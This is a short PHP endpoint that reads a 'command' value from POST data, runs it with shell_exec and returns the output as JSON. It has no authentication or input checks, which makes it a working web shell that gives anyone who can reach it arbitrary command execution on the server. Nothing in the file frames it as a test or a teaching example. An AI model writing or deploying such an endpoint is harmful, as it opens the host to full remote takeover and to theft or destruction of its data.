<?php

require_once __DIR__ . '/../lib/headers.php';

$command = $_POST['command'] ?? null;

if (!$command) {
    http_response_code(400);
    echo json_encode(['error' => 'No command provided.']);
    return;
}

$output = shell_exec($command);

echo json_encode(['output' => $output]);
